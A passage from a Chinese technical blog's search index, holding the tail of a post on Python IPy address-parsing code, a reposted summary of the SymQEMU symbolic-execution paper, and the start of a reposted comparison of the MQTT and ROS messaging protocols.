try to interprete it as a decimal digit - # this ony works for numbers &gt; 255 ... others # will be interpreted as IPv4 first byte if intval &gt; MAX_IPV6_ADDRESS: raise ValueError(&quot;IP Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV6_ADDRESS, intval)) if intval &lt;= MAX_IPV4_ADDRESS and ipversion != 6: return (intval, 4) else: return (intval, 6) raise ValueError(&quot;IP Address format was invalid: %s&quot; % ipstr) 分解IPv6地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667def _parseAddressIPv6(ipstr): items = [] index = 0 fill_pos = None while index &lt; len(ipstr): text = ipstr[index:] if text.startswith(&quot;::&quot;): if fill_pos is not None: # Invalid IPv6, eg. &#x27;1::2::&#x27; raise ValueError(&quot;%r: Invalid IPv6 address: more than one &#x27;::&#x27;&quot; % ipstr) fill_pos = len(items) index += 2 continue pos = text.find(&#x27;:&#x27;) if pos == 0: # Invalid IPv6, eg. &#x27;1::2:&#x27; raise ValueError(&quot;%r: Invalid IPv6 address&quot; % ipstr) if pos != -1: items.append(text[:pos]) if text[pos:pos+2] == &quot;::&quot;: index += pos else: index += pos+1 if index == len(ipstr): # Invalid IPv6, eg. &#x27;1::2:&#x27; raise ValueError(&quot;%r: Invalid IPv6 address&quot; % ipstr) else: items.append(text) break if items and &#x27;.&#x27; in items[-1]: # IPv6 ending with IPv4 like &#x27;::ffff:192.168.0.1&#x27; if (fill_pos is not None) and not (fill_pos &lt;= len(items)-1): # Invalid IPv6: &#x27;ffff:192.168.0.1::&#x27; raise ValueError(&quot;%r: Invalid IPv6 address: &#x27;::&#x27; after IPv4&quot; % ipstr) value = parseAddress(items[-1])[0] items = items[:-1] + [&quot;%04x&quot; % (value &gt;&gt; 16), &quot;%04x&quot; % (value &amp; 0xffff)] # Expand fill_pos to fill with &#x27;0&#x27; # [&#x27;1&#x27;,&#x27;2&#x27;] with fill_pos=1 =&gt; [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;2&#x27;] if fill_pos is not None: diff = 8 - len(items) if diff &lt;= 0: raise ValueError(&quot;%r: Invalid IPv6 address: &#x27;::&#x27; is not needed&quot; % ipstr) items = items[:fill_pos] + [&#x27;0&#x27;]*diff + items[fill_pos:] # Here we have a list of 8 strings if len(items) != 8: # Invalid IPv6, eg. &#x27;1:2:3&#x27; raise ValueError(&quot;%r: Invalid IPv6 address: should have 8 hextets&quot; % ipstr) # Convert strings to long integer value = 0 index = 0 for item in items: try: item = int(item, 16) error = not(0 &lt;= item &lt;= 0xffff) except ValueError: error = True if error: raise ValueError(&quot;%r: Invalid IPv6 address: invalid hexlet %r&quot; % (ipstr, item)) value = (value &lt;&lt; 16) + item index += 1 return value 通过分割移位的方式转换输入为IP 参考链接RFC 791; RFC 4632 ↩RFC 2373 ↩https://pypi.org/project/IPy/#description ↩https://github.com/autocracy/python-ipy ↩","categories":[],"tags":[{"name":"IPy","slug":"IPy","permalink":"https://mundi-xu.github.io/tags/IPy/"},{"name":"python","slug":"python","permalink":"https://mundi-xu.github.io/tags/python/"},{"name":"lab","slug":"lab","permalink":"https://mundi-xu.github.io/tags/lab/"},{"name":"ip","slug":"ip","permalink":"https://mundi-xu.github.io/tags/ip/"}]},{"title":"【转载】带你搞懂符号执行的前世今生与最近技术","slug":"带你搞懂符号执行的前世今生与最近技术","date":"2021-02-23T07:30:00.000Z","updated":"2021-03-12T09:56:32.676Z","comments":false,"path":"2021/02/23/带你搞懂符号执行的前世今生与最近技术/","link":"","permalink":"https://mundi-xu.github.io/2021/02/23/%E5%B8%A6%E4%BD%A0%E6%90%9E%E6%87%82%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%E4%B8%8E%E6%9C%80%E8%BF%91%E6%8A%80%E6%9C%AF/","excerpt":"iddm带你读论文——SymQEMU:Compilation-based symbolic execution for binaries","text":"本文由iddm原创发布转载自 https://www.anquanke.com/post/id/231413 iddm带你读论文——SymQEMU:Compilation-based symbolic execution for binaries 本篇文章收录于2021年网络安全顶会NDSS，介绍了最新的符号执行技术，并且清晰地比较了当前流行的各种符号执行的引擎的优劣势，可以比较系统的了解符号执行技术的相关知识 title = {{SymQEMU}: Compilation-based symbolic execution for binaries},author = {Poeplau, Sebastian and Francillon, AurÃ©lien},booktitle = {Network and Distributed System Security Symposium},year = 2021,organization = {Network &amp; Distributed System Security Symposium},month = {February},affiliations = {Eurecom, Code Intelligence},extralink = {Details: tools/symbolic_execution/symqemu.html}download_address = https://www.ndss-symposium.org/wp-content/uploads/2021-118-paper.pdf 摘要符号执行技术是针对软件分析和bug检测的强力技术，基于编译的符号执行技术是最近提出的一种方法，当对象源代码可以得到时可以提升符号执行的性能。本文提出了一种新的基于编译的，针对二进制文件的符号执行技术。此系统名为symqemu，在qemu基础之上开发，在将target程序转换为host架构的机器码之前修改其IR，这使得symqemu能够将编译符号执行引擎的能力应用于二进制文件，并且在维持架构独立性的同时能够获得性能上的提升。 本文提出了这个方法以及其实现，我们利用统计学方法证明了他比最先进的符号执行引擎s2e以及qsym，在某些benchmarks上，他甚至由于针对源码带分析的symcc。并且利用symqemu在经过多重测试的library上发现了一个位置漏洞，证明了他在实际软件中的可用性。 介绍符号执行技术近年来大力发展，一种有效但是代价大的技术，其经常与fuzzing技术混合，并成为混合fuzzing，fuzzing用来探索容易到达的路径，而符号执行用来探索不易到达的路径。 针对符号执行技术的重要特征之一就是其是否需要提供源代码进行分析，而真实世界中的大多数程序(由于某些原因)是不提供源代码的。 所以binary-only的符号执行技术被迫切需要，但是面临一个两难的困境，到底是选择性能的提升还是架构的独立性呢？比如，QSYM针对binary有很高的性能，但是其仅限于x86处理器的指令集。它不仅仅造成了系统架构依赖性，并且由于现在处理器指令的庞大提升了其复杂性。SE则是可以被广泛的应用但是性能较差，S2E可以分析多架构代码以及内核代码。然而他这么做的代价是针对target程序的多种翻译的最终表示，导致了复杂性升高以及影响性能。 在本文中，我们提出了一个方法（a）独立于被测试的程序的target架构（b）实现复杂度低（c）具有高性能。symqemu的关键是qemu的cpu 仿真可以同于轻量级的符号执行机制：不是像s2e中使用中的那种计算复杂度高的将target程序向IR的转换方式，我们hook qemu中的二进制转换机制为了将符号处理直接编译到机器码中。这样使得在性能优于最先进符号执行系统的同时可以保持加够独立性。目前，我们针对于linux用户程序(ELF binaries)，但我们可以将其拓展到任何qemu支持的架构中取，同时我们将symqemu开源来加速未来相关领域的研究。 将符号处理编译到target程序中同样是symcc的核心工作，其性能优于其他符号执行引擎，但是symcc只针对于有源码的程序。symqemu性能优于se2以及qsym，并且相比于基于源代码的symcc性能来说，某些情况也是可以比较。 本文工作主要有以下贡献： 分析了当前最先进的binary-only的符号执行引擎并且明确了其设计中的优势和劣势。 提出了一个方法，融合了其他工具的优势，避免了其他工具的缺点，核心idea是应用基于编译的符号执行技术到binary上，我们工具的源代码开源。 进行了详细的评价试验，并且实验数据以及实验脚本开源。 背景符号执行符号执行的目的是在目标程序的执行过程中跟踪中间值是如何计算的，每一个中间值都可以表示为程序输入的一个公式。在任何点，系统都会使用这个公式查看这个点是否可达，这个指针是否为空等。如果答案是确定的，那么符号执行引擎将会提供测试用例，一个新的输入例子来触发对应的行为。所以符号执行可以被方便的用来探测程序路径以及触发bug。 为了跟踪程序的计算过程，符号执行系统必须对程序指令集有一个深入的理解，许多实现都是通过将程序翻译为IR，比如LLVM和VEX。IR随后被符号化执行，因为执行器只需要处理IR(通常由少量的指令集构成)，所以实现相对比较简单。并且在之前的工作中我们发现，在对进行测试的程序的高级表示的查询较低级指令的表示的查询更加容易解决。 然而将程序转换为IR需要计算能力并且对程序执行过程引入了开销；然而一些实现过程放弃了翻译而直接工作在机器代码上，这种解决方案除了性能上的优势，同时在执行器无法怎样解释指令时，会帮助提升鲁棒性。然而在另一方面，这种解决方案会导致执行器被限制在了一种特定的架构之中。另一种基于源码的执行器在实际中并不是那么广泛使用，因为大多数情况下只能得到二进制文件。 binary-only符号执行仅仅针对二进制文件的符号执行添加了许多挑战：缺少源代码，将程序翻译为IR需要可靠的反汇编器；由于静态反汇编的挑战，大多数实现都是在运行态按需进行反汇编。当源码不可得时，针对架构的支持同样也是重要的，此时交叉编译不可行。尤其针对嵌入式设备来说，缺少对多架构的支持是不可行的。 无需翻译的执行器除了面对复杂实现带来的可维护问题外，还面临可移植性问题。将程序翻译为中间语言的执行器需要可靠的反汇编器，已经有大量的工作来确定翻译器的准确性。基于源码的执行器可以较容易的获得IR。 基于二进制文件的符号执行对于高性能以及多架构支持具有更迫切的需求。 最先进解决方案下面描述最先进的符号执行实验方案以及他们各自对应解决的问题。 angr 一个经典的符号执行翻译器，使用VEX，Valgrind框架的翻译器和IR。目标程序在运行时被翻译。其中一个优化，angr可以在Unicorn，基于qemu的快速CPU模拟器，上执行不涉及符号数据的计算。 由于基于VEX，agnr固然可以支持所有VEX能够处理的架构，因为angr核心由python语言实现，所以他速度慢但是很通用。 s2e 由于想要将基于源代码符号执行覆盖范围拓展到目标程序依赖以及操作系统内核，创造了s2e。为了实现这个目的，s2e在qemu仿真器内执行整个操作系统并且将其与KLEE链接为了符号化执行相关代码。 这个系统相当复杂，包括被测试程序的多重翻译： QEMU是一个二进制文件翻译器，比如在通常操作中，他讲目标程序从机器代码翻译为一种中间表示即TCG ops，然后将其重新编译为针对host CPU的机器码。 当执行是设计符号化数据时，S2E使用的修改过的QEEMU不再将TCGops重编译为机器代码，他将其翻译为LLVM bitcode，随后将其传递给KLEE。 KLEE符号化解释执行LLVM bitcode，然后将结果的具体情况回传给QEMU。 此系统可以很灵活的处理不同处理器架构，并且可以支持针对操作系统全层面的计算跟踪。然而他需要付出一下代价：S2E是一个具有庞大代码基础的复杂系统。并且两部分翻译，从机器码翻译为TCG ops和从TCG ops翻译为LLVM bitcode损害了他的性能。与angr针对用户态程序来比较，S2E需要更多的设计建立以及运行，但是提供了一个更加全面的分析。 QSYM QSYM在性能上有极大的增强，他不将目标程序翻译为中间语言。他在运行态时向x86机器码内进行插桩来向二进制文件内添加符号追踪。具体来讲，他应用了Inter Pin，一种动态二进制插桩框架，来向目标程序内插入hook代码。在hook内部，他和程序运行的实际代码等价的运行符号代码。 这种方式产生了一种针对x86程序的非常快速并且鲁棒性很强的符号执行引擎。然而，这个系统固然会被限制在x86框架内，并且实现是繁琐的，因为他需要处理在计算中可能出现的任何指令。并且将其迁移到其他架构将会有很大的困难。 symcc 最近提出的符号执行工具，SYMCC，同样是本文作者之前的工作，基于源代码的，不支持分析二进制文件。SYMQEMU的灵感来自于SYMCC，所以简要概括一下他的设计。 我们在设计SYMCC时观察到，目前大多数符号执行系统是解释器。然而我们却提出一个基于编译的方法，并且展示了他能够提升执行性能以及系统实际探索能力。SYMCC在编译器内进行hook，并且在target代码内进行插装，并且注入实施支持库的调用。因此符号执行成为了被编译文件的一部分。并且分析代码可以进行优化，并且插装代码并不会在每次执行时进行重复。 SYMCC基于编译的方式需要编译器，所以他只能在被测试程序源代码可用时发挥作用。尽管如此，我们认为这个方式是足够有前途，所以一直寻找一种方式将其应用到binary-only的方面之中，本文的主要工作就是说明基于编译的符号执行系统是如何在二进制文件上高效的工作。 SYMQEMU现在提出针对binry-only设计实现的SYMQEMU。他的灵感来自于之前的工作并结合了如今最先进的符号执行系统的技术。 design系统两个主要目标： 实现高效能，以致于实际软件。 合理的架构独立性，比如将其迁移到新的处理器架构不需要做过多工作。 基于之前的调查，我们发现流行的最先进的符号执行系统实现了如下两个目标中的一个，但并非全部：angr和s2e是架构灵活的但是性能差；QSYM在性能上比较高但是其只针对x86架构。 如今针对架构独立的解决方案是将被测程序翻译为IR，这样如果想要支持一个新的架构，只有翻译器需要移植，理想情况下，我们选择一种中间语言，其已经存在支持多种架构的相关翻译器。以中间语言灵活地表示程序是一种著名的，已经成功的应用于许多其他领域的技术，比如编译器设计以及静态代码分析。我们也将这种技术合并到我们的设计中来。 当将程序翻译为中间语言获得便利的同时，我们同样需要了解这种方式对于性能的影响：将binary-only程序静态翻译是具有挑战性的，因为反汇编器可能是不可靠的，尤其是存在间接跳转的情况下，并且在分析过程中运行时进行翻译会提升功耗。我们认为这是s2e性能劣于QSYM的主要原因。我们的目标就是找到一种翻译系统同时保持性能优越。 首先，我们主要到s2e以及angr都收到了非重要问题的影响，并且这些问题都是可以通过工程方面的工作解决的： S2E将被测试程序翻译了两次，然而如果符号执行过程是在第一次中间表示上实现的话，第二次翻译过程其实是可以避免的。 angr的性能受到python实现影响，将其核心代码移植到一种更快速的语言中会显著提升速度。 然而我们的贡献并不仅仅是找出并且避免上述两个问题，我们还观测到：s2e以及angr，以及其他所有的binaty-only的符号执行器，都解释执行被测试程序的中间表示，解释是设计的核心部分。我们推测，将目标程序编译为插桩版本将会带来很高的性能上的提升。虽然SYMCC是基于源代码的，基于编译的符合执行引擎，但是他证明了这一点。 收到上述观测到的启发，我们的设计方法如下： 在运行态将目标程序翻译为IR。 为符号执行所需的IR插桩。 将IR编译为适合CPU运行分析的机器码并且直接执行。 通过将插桩的目标程序编译为机器码，补偿了在第一阶段将二进制文件翻译为中间代码时的性能损失。CPU执行机器码比解释器运行IR速度快得多，因此我们获得了一个可以与没有翻译的系统的性能相当的系统，同时由于进行了程序翻译可以保持架构的独立性。 implementation我们在qemu的基础之上实现了SYMQEMU，选择qemu的原因是因为他是一个鲁棒性的系统仿真器，并且可以支持许多架构，在他的基础之上进行实现，我们可以实现架构独立性。并且qemu还有另一个特点正好满足我们的需求，他不仅将二进制文件翻译为针对处理器独立的IR，他同时支持将中间语言便已成为host CPU的机器码。qemu的主要优点是他能够将二进制文件翻译为不同host架构的机器代码，并且可以完成全系统仿真，方便于之后拓展支持交叉架构的固件分析。 具体来说，我们拓展了QEMU的组件TCG。在未被修改的qemu中，TCG负责将guest架构的机器码块翻译为架构独立的语言，叫做TCG ops，然后编译这些TCG ops为host架构的机器码。由于性能原因，这些翻译好的blocks随后被缓存，所以翻译在每次执行过程中只需要进行一次。SYMQEMU在这过程中插入了一步：当被测程序翻译为TCG ops时，我们不仅插桩来模拟guest CPU而且产生一些额外的TCG ops来建立对应的符号约束表达式。针对建立符号表达式以及求解这些的支持库，symqemu重用SYMCC的支持库，即重用QSYM的。 （此处有详细例子，感兴趣去读原文） 目前我们使用的qemu linux用户模式的仿真，即我们只模拟了普通用户空间的guest系统。系统调用被转换来满足host架构的要求，这些是针对host的内核来工作的，使用了qemu常规的机制。因此我们的符号执行分析在系统调用处停止，与QSYM以及angr类似。与全系统仿真(比如s2e)来讲，这样节省了为每个target架构准备系统镜像的方面，并且提升了性能，因为是直接运行kernel代码而不是通过仿真。但是如果需要的话，SYMQEMU是很容易的被拓展为QEMU的全系统仿真。 架构独立首先要明确，执行分析的主机的架构叫做host，被测代码在其架构之上被编译的叫做guest。尤其是在嵌入式设备分析中，host与guest架构不同是显然的，嵌入式设备的系统进行符号执行分析的能力不足，所以将固件放置到其他系统中进行分析，SYMQEMU就是为这种情况准备的，能够在多架构下运行。 SYMQEMU利用qemu TCG translators，涵盖多种处理器类型，并且我们针对其修改几乎独立于target架构。 也就是说，SYMQEMU可以在相关的host架构上运行并且可以支持所有qemu能够处理的guest架构下的二进制文件的分析。 与之前的设计比较 本节之处SYMQEMU与最先进的符号执行系统的不同之处。 与angr和s2e相似，SYMQEMU使用传统的，以IR来完成符号执行处理，显著的降低了实现的复杂性。但是不同于此二者的是，他是基于编译的符号执行技术，显著的提升了性能。 与QSYM比较，SYMQEMU设计最重要的优势是架构灵活性的同时，能够维持很高的执行速度。在qemu之上进行设计使其能够或者很多的数量的模拟器支持的架构处理能力。 SYMCC虽然不能够分析二进制代码，但是其给SYMQEMU提供了基于编译的思路。此二者都是通过修改其IR来在目标程序中插入符号处理，并且都是将结果直接编译为能够高效运行的机器码。然而SYMCC是面向源代码的，而SYMQEMU解决了分析二进制文件的不同指令集的挑战，SYMQEMU在翻译过程中的TCG ops中插桩，SYMCC在编程过程中的LLVM bitcode内插桩。并且SYMQEMU解决了guest和target架构不匹配的问题。 我们认为本文工作结合了s2e以及angr的优势，即多架构支持，同时结合了symcc的优点，高性能，摒弃了他们的缺点；并且我们找到了一种方式，能够将SYMCC的核心idea应用到二进制文件的分析之中。 内存管理当symqemu分析软件时，他会建立很多符号公式来描述中间结果和路径约束。他们占用的内存会随着时间而一直增长，所以symqemu需要一种方式来清除那些不再被使用的公式。 首先我们讨论一下为什么内存管理是第一位的。IR在任何合理的程序中或对程序流有影响，或者成为最终结果的一部分；在前者情况下，对应的表达式被添加到路径约束的集合中，并且不能被清楚；但是针对后者情况，表达式成为最终结果的描述中的字表达式。所以符号表达式是什么时候变成不重要的呢？关键就是程序的输出是程序结果的一部分，但是他可能在程序的结束之前就已经产生了。 所以我们应该在符号在最后一次使用之后将其清除。QSYM使用的C++ smart points来实现了这个目的，但是我们在被修改的qemu中不能简单的相同的办法：TCG是一个动态翻译器，由于性能因素，它不产生任何被翻译代码的拓展分析。这使得高效的确定插入清除代码的位置非常困难。并且经验告诉我们，大多数程序中包含很少的，在程序执行过程之中无用的，相关符号数据和表达式，所以我们不想我们的清除机制造成很大的功耗。 我们使用了一种乐观的清除机制，在一种expression garbage collector的基础之上：SYMQEMU跟踪所有从后端获得的符号表达式，如果他们的数目非常大时进行回收。最主要的观测是所有live表达式可以通过扫描如下发现 模拟的CPU符号寄存器 存储对应符号内存结果的符号表达式的，内存中的shadow regions 以上两种，后端都是可感知的。在感知到所有live表达式之后，symqemu将其与所有已经创建的符号表达式进行比较，并且释放那些不再使用的表达式。尤其是当一个程序在寄存器和内存中移除了计算的结果，对应的符号表达式同样被认为不再使用也被移除。我们将 expression garbage collector 和QSYM’s smart pointer based memory management相联系，这两种基础都认为表达式不再使用之后可以被释放。 修改TCG ops我们的方法要求能够像TCG ops中插桩。然而TCG不支持在翻译过程之中的拓展修改功能，作为一个翻译器，他高度关注速度问题。因为，对于TCG ops的程序化修改的工作很少。然而LLVM提供了丰富的API，支持compiler检查和修改LLVM bitcode。TCG ops单纯的将指令存储在一个平面链表中，而没有任何高层次的类似于基本快的数据结构。并且程序流被期望与翻译块呈线性关系。 为了不和TCG产生不一致，我们的实现对每一个指令生成时进行符号处理。虽然这种方法可以避免与TCG 优化以及代码生成器产生的问题，但是使得静态优化技术不可行，因为我们每次仅仅关注一条指令。尤其是我们无法静态确定给定的值是否是实际值，并且如果所有的操作都是符号值的情况下，我们也不能产生跳过符号计算的阶段的跳转。 因此我们最终于TCG所需要的运行环境的限制条件达成了妥协，同时允许我们有相关很高的执行速度：我们在支持的调用库中进行实际值性检查，这样，如果实际计算的输入都是准确值的话，就可以直接跳过符号值计算，但是这样会导致额外的库调用开销。 shadow call stackQSYM引入了上下文敏感的基本快剪枝，如果在同样的调用堆栈环境中频繁调用确定的计算会导致压抑符号执行(基于如下直觉，在同样的上下文环境中重复的执行分析并不会导致新的发现)。为了实现这个优化，符号执行需要维护一个shadow call stack，记录跟踪call以及return指令。 在qemu基础之上，我们面临一个新的挑战，TCG ops是一个非常低级别的target程序的中间表示。尤其是，call以及return指令不是被表示为单独的指令而是被翻译为一系列TCG ops。比如一个在x86架构下的程序调用会生成TCG ops，其将返回地址push到模拟的stack上，调整guest的stack pointer，并且根据被调用函数来修改guest的指令。这使得仅仅通过检测TCG ops来以一个可靠并且架构独立的方式来识别call以及return是不可能的。我们选择了如下优化来提高鲁棒性：在架构独立的，能够将机器代码转换为TCG ops的qemu 代码中，每当遇到call和return时，我们会通知代码生成器。缺点就是针对每个target架构，类似的通知代码都必须被插入到翻译代码中去，但这并不复杂。 评价详见原文，主要是一些指标与测试效果 未来工作全系统仿真SYMQEMU目前运行符号执行针对linux用户态二进制程序，之后将会对其拓展到全系统分析，尤其是针对嵌入式设备而言，分析此类程序要求全系统仿真。 我们认为在SYMQEMU实现这一改进是可能的。将target翻译为TCG ops，对其插桩，并将其编译为机器码，这些基本过程不改变。需要添加的一个机制是将符号化数据引入到guest系统中，这是受到S2E fake-instruction技术的启发，以及当在guest内存以及符号表达式之间存在映射时，shadow-memory系统需要记录虚拟MMU的数量。最终将会产生一个不仅可以对用户态程序进行测试，同样可以对内核代码进行测试的系统，并且其同样可分析非linux系统的代码以及裸固件等。 caching across executions混合fuzzing技术的特点之一是能够对同一程序进行大量的连续执行。作为动态翻译器，SYMQEMU在运行态按需翻译target程序。并且翻译的结果在单个运行的过程之中被缓存，但是当目标程序执行终止时这些缓存结果会被丢弃。我们猜想，可以通过缓存多个执行过程中的翻译结果，可以显著提升结合SYMQEMU的混合FUZZ的性能。主要的挑战就是需要确定目标是确定性加载的，以及针对自我修改代码需要进行特殊处理。所以，这些潜在的优化性能提升主要在于被测程序的特点。 symbolic QEMU helpersQEMU利用TCG ops表示机器码，然而一些target的指令难以用TCG ops来进行表示，尤其是在CISC架构之上。针对这情况，QEMU使用helpers:可以被TCG调用的内置变异函数，仿真target架构的每一个复杂指令。由于helpers工作在常规的TCG架构之外，SYMQEMU在TCG层级的插桩不能插入符号处理到他们之中。这样的结果是implicit concretization，在分析使用大量目标的指令时会产生精读损失。 我们有如下两种实现qemu helpers符号处理的方式： 第一种方式是为每一个要求的helper手动添加符号等价式，更像在一些符号执行引擎中使用的常用libc功能的函数总结。这个方式非常容易实现，但是不方便应用于大数量的helpers中。 另一种方式是自动化的实现helpers的符号化版本。为了实现这个目的，SYMCC可以被用来编译符号化追踪到helpers中，他的源代码作为QEMU的一部分是公开的。最终得到的二进制文件是和SYMQEMU兼容的，因为SYMCC的使用相同的符号推理的后端。S2E也是使用类似的方式编译helpers到KLEE中的解释器中的LLVM bitcode。 相关工作binary-only符号执行Mayhem是一个高性能的基于解释器的符号执行系统，赢得过DAPRA CGC比赛，然而由于其不开源无法比较性能。Triton是可以以两种方式运行的符号执行系统，一种使用二进制文件转换，类似于QSYM，一种使用CPU仿真，类似于S2E以及angr。Eclipser覆盖了介于fuzzing和符号执行之间的一些中间区域，他认为在分支条件和输入数据之间存在线性关系。这种约束的简化提升了系统的性能，然而他却不能发现常规符号执行系统可以发现的那些路径。Redqueen利用一种启发式的方法寻找路径条件和输入之间的关系。SYMQEMU相比较来说实现了全系统仿真。 运行态bug检测混合fuzzing依靠fuzzer以及sanitizers来检测bugs。Address sanitizer是一种流行的用来检测确定内存错误的sanitizer。由于其需要源代码来产生插桩程序， Fioraldi et al设计了QASan，基于qemu的系统来对二进制文件实现类似的检测。有大量的需要源代码的sanitizers。我们推测通过QASan的思路，可以将大量上述sanitizers用于二进制文件分析。 混合fuzzingDriller是基于angr的混合fuzzer，其设计理念类似于QSYM，但是有其angr的python实现以及基于解释器的方式，其执行速度较低。与QSYM以及SYMQEMU比较，它使用了一种更加精细的策略来融合fuzzer以及符号引擎：他监控fuzzer的进展情况，并且当其似乎遇到自身无法解决的障碍时，会自动切换到符号执行。类似的，最近提出的Pangolin通过不仅提供fuzzer测试用例，以及一些抽象的符号约束，还有快速样本生成方法，强调了fuzzer结合符号执行的优势；利用这些，fuzzer能够生成可以有很大概率解决由符号执行生成的路径约束的输入。 我们认为更加精细的符号执行和fuzzer的组合可以很大程度上提升混合fuzzing的性能。 总结我们提出了SYMQEMU，一种基于编译的，针对二进制文件的符号执行引擎。我们的评价展示了SYMQEMU性能优于最先进的符号执行引擎并且可以在某些方面与基于源代码的符号执行技术相匹配。而且SYMQEMU非常方便的向其他架构进行迁移，只需要几行代码即可。","categories":[],"tags":[{"name":"符号执行","slug":"符号执行","permalink":"https://mundi-xu.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"}]},{"title":"【转载】物联网协议——MQTT与ROS","slug":"物联网协议——MQTT与ROS","date":"2021-02-18T02:00:11.000Z","updated":"2021-03-12T09:56:26.650Z","comments":false,"path":"2021/02/18/物联网协议——MQTT与ROS/","link":"","permalink":"https://mundi-xu.github.io/2021/02/18/%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E2%80%94%E2%80%94MQTT%E4%B8%8EROS/","excerpt":"本文仅介绍MQTT与ROS两种协议的基本概念并做横向对比，不会涉及各个协议的高级特性","text":"本文由ERROR404原创发布https://www.anquanke.com/post/id/231329 0x00 写在前面本文仅介绍MQTT与ROS两种协议的基本概念并做横向对比，不会涉及各个协议的高级特性，两种协议的本地搭建方式也会在下一篇文章中予以阐述，以下高级特性若读者有兴趣可以自行收集资料了解。（也不排除我后面会发相关文章，老鸽子了） MQTT高级特性：保留消息(Retained Messages)、遗嘱消息(Last Will and Testament)、会话保持(Keep Alive)、客户端托管(Client Take-over)、链路保密(TLS)、访问控制(ACL)。 ROS高级特性：参数服务器(Parameter Server)、服务端-客户端方式。 0x01 概述 MQTT是基于发布-订阅模式的C/S架构消息传输协议，它轻量、开放、简单且易于实施。这些特性使其非常适合在特殊的受限情况下使用，例如用于机器对机器(M2M)和物联网(IoT)中的通信，这些环境中由于存储空间和网络带宽非常宝贵因此需要代码体积尽量小，网络协议尽量简单，MQTT正好满足这两点要求。 ROS是用于编写机器人软件的灵活框架，它是工具、库和约定的集合，旨在简化跨各种机器人平台创建复杂而强大的机器人行为的任务。 0x02 关于订阅者-发布者模式观察者模式(Observer Pattern)在继续说订阅者-发布者模式之前，有必要提出观察者模式的概念，观察者模式定义了对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知，并自动更新。观察者模式属于行为型模式，行为型模式关注的是对象之间的通讯，观察者模式就是观察者和被观察者之间的通讯。 观察者模式有一个别名叫“发布-订阅模式”，或者说是“订阅-发布模式”，订阅者和订阅目标是联系在一起的，当订阅目标发生改变时，逐个通知订阅者。我们可以用报纸期刊的订阅来形象的说明，当你订阅了一份报纸，每天都会有一份最新的报纸送到你手上，有多少人订阅报纸，报社就会发多少份报纸，报社和订报纸的客户就是上面文章开头所说的“一对多”的依赖关系。 发布-订阅模式(Pub-Sub Pattern)简介上面提到发布-订阅模式是观察者模式的一个别称，但是经过时间的沉淀，这个模式已经慢慢独立于观察者模式，成为另外一种不同的设计模式。 在现在的发布-订阅模式中，称为发布者的消息发送者不会将消息直接发送给订阅者，这意味着发布者和订阅者不知道彼此的存在。在发布者和订阅者之间存在第三个组件，称为消息代理或调度中心或中间件，它维持着发布者和订阅者之间的联系，过滤所有发布者传入的消息并相应地分发它们给订阅者。 举一个例子，你在微博上关注了A，同时其他很多人也关注了A，那么当A发布动态的时候，微博就会为你们推送这条动态。A就是发布者，你是订阅者，微博就是调度中心，你和A是没有直接的消息往来的，全是通过微博来协调的（你的关注，A的发布动态）。 特点使用发布订阅模式可以对发布者和订阅者进行解耦，主要表现为： 空间解耦：对于任意的发布者与订阅者，他们事先不需要知道彼此的存在，甚至不需要知道彼此的IP和端口。 时间解耦：对于任意的发布者与订阅者，他们不需要同时运行。 同步解耦：在通信发生时，他们彼此正在进行的任务不需要进行中断。 0x03 关于MQTT协议协议特点MQTT协议在实际实现中就整体使用了发布者-订阅者模式，那么依据发布者-订阅者模式的特点，MQTT同样实现了这三个特点： 空间解耦：对于使用了MQTT协议的系统，每一个发布者或订阅者只需要知道消息代理(或称为MQTT主服务器)的IP/端口就可以进行消息的发布与接收。 时间解耦：尽管大多数情况下使用MQTT协议的系统在进行消息传递时都是实时的，但是在必要的情况下消息代理可以为离线的客户端储存消息。必要的情况应当满足以下两个条件： 客户端曾经连入过消息代理并建立过持久化会话 需要储存的消息的QoS(服务质量)应当大于0 同步解耦：MQTT协议的系统的绝大多数客户端库都是异步的，他们的函数模式基本都是基于callback模式的，因此在其发布消息或等待消息时不会发生流程的阻塞。但是，MQTT提供了部分同步方法，如果某些特定消息必须进行同步，那么可以使用这些方法来达到理想的同步效果。 PS：当客户端与消息代理连接时，可以额外指定持久化会话标识，消息代理接收到后会与此客户端建立持久化会话而非临时会话，与临时会话的区别只要在于，在持久化会话中，消息代理会帮客户端保存特定的信息。 话题-Topic基本概念根据上面的描述，我们可以很轻易地画出在MQTT中消息传递的拓扑图： 可以看到，我们在拓扑中引入了话题(Topic)的概念，对于MQTT系统，其通常采用基于话题的消息过滤机制，即消息代理会依据话题名来进行消息的分发。 编写规范在MQTT中，话题名是由一串UTF-8编码的字符串组成的，例如： kingdom/phylum/class/order/family/genus/species（界门纲目科属种） 这同时也是一个多级主题的示例，在MQTT中，允许存在多级话题，可以向任何一级发布消息，每一个话题级别由/分割。 对于主题名，有如下规则： 每个主题至少包含一个字符。 主题允许包含空格而不会被截断。 大小写敏感。 单个/是一个有效的话题。 发布消息时不允许包含通配符作为话题名。 发布消息时不允许使用$开头的主题名。 对于这些规则，有以下几点补充说明： 不要使用前导正斜杠。例如/kingdom/phylum，尽管这也是合法的主题名，但是此时kingdom的主题层级不再是顶级主题，通常这会导致混乱的发生。 不要使用空格作为主题名的一部分。例如shui guo/xi gua，尽管这也是合法的主题名，但是通常空格会导致可读性下降，进而导致混乱的发生。 在主题名中加入UID。例如0df8827c-2af2-4710-84f3-b35f30f177f5/data，尽管这并非强制需求，但是配合ACL规则，这将可以保证良好的可读性，并且避免敏感信息的泄露。 非必要不要订阅#。这将导致本地的消息负载过大进而导致宕机，如确有需要记录所有消息(例如实现了一个logger)，可以考虑基于MQTT做功能扩展实现负载均衡。 不要操作$开头的主题。这部分主题由消息代理保留，一般用于消息代理保存相关统计信息。例如： 12345$SYS/broker/clients/connected$SYS/broker/clients/disconnected$SYS/broker/clients/total$SYS/broker/messages/sent$SYS/broker/uptime 通配符订阅者在订阅话题时，除了可以使用完整的话题名之外，还可以使用通配符进行话题的订阅。 